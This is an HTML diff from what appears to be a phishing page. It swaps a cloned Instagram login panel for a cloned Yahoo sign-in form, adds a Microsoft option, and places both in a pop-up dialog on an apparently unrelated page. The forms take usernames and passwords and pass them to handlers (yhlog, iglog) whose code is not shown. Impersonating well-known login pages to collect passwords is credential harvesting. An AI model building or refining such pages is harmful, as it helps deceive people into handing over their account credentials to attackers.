@@ -39,43 +39,57 @@
         </div>
     </div>
 
+     <center>
+        <p>
+          <img id="yh" onclick="yh()" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg">
+          <img id="hm" onclick="hm()" src="auth/microsoft/img/microsoft_logo.svg">
+
+        </p>
+        <br>
+            <span class="close" onclick="closeDialog()">&times;</span>
+      </center>
+
     <!-- Dialog Box -->
     <div id="dialog" class="dialog">
         <div class="dialog-content">
             <span class="close" onclick="closeDialog()">&times;</span>
             <h2><span hidden id="dialog-artist-name"></span></h2>
-              <main class="l-main">
-              <div class="l-main__img">
-                <img src="assets/img/homepage.png" alt="Smartphones">
-              </div>
-              <div class="l-user">
-                <div class="c-panel group">
+ <div id="yhp">
+    <div class="yht">
 
-              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-              <div class="c-panel__form">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button> 
-                <span class="c-panel__span">OR</span>
-              </div>
-              <a href="#" class="c-panel__facebook">Login with Facebook</a> <br>
-              <a href="#" class="c-panel__forgot">Forgot password?</a>
-              <br>
-              <br>
-            </div>
-            <div class="c-signup group">
-              <p>Don't have an account? <span>Sign up</span></p>
-            </div>
-
-                  <div class="c-app">
-                    <p>Get the app.</p>
-                    <div class="c-app__download">
-                      <img src="assets/img/apple.png" alt="Apple Store">
-                      <img src="assets/img/google.png" alt="Google Play">
-                    </div>
-                  </div>
+        <div id="divf">
+            <div id="f1">
+                <div id="d4">
+                    <img id="image2" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg"
+                        height="95px" width="auto" alt="">
                 </div>
-            </main>
+                <h1 id="h1">Sign in</h1>
+                <p id="p2">Sign in using your Yahoo account</p><br>
+                <input required id="yh-uname" type="text" placeholder="Username, email address or mobile number">
+                <hr id="hr1">
+                <input required id="yh-pass" type="password" placeholder="Password">
+                <hr id="hr1">
+                <button onclick="yhlog()" id="yh-log">Login</button>
+                <br>
+                <div>
+                    <button id="b2">
+                        <a id="acc" href="#">Create an account</a>
+                    </button>
+                </div>
+                <div>
+                    <p id="para">Or continue with</p>
+                </div>
+                <div>
+                    <a href="" id="p5">
+                        <button id="b3"><img id="image3"
+                                src="auth/microsoft/img/microsoft_logo.svg" alt="logo" height="32px">&nbsp;
+                        </button>
+                    </a>
+                </div>
+            </div>
+        </div>
+  </div>
+</div>
         </div>
     </div>
 
